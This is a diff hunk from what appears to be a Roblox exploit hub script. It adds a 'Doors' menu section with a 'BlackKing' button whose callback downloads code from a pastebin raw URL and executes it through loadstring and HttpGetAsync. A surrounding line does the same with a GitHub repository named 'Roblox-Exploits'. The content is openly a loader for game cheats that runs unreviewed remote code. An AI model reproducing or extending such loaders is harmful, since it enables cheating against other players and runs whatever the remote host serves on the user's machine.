@@ -653,6 +653,18 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/
 })
 -- Section
 local Section = Tab:AddSection({
+	Name = "Doors"
+})
+-- Button
+Tab:AddButton({
+	Name = "BlackKing",
+      Callback = function()
+loadstring(game:HttpGetAsync("https://pastebin.com/raw/R8QMbhzv"))() 
+      		print("Clicked")
+  	end    
+})
+-- Section
+local Section = Tab:AddSection({
 	Name = "Adopt Me"
 })
 -- Button
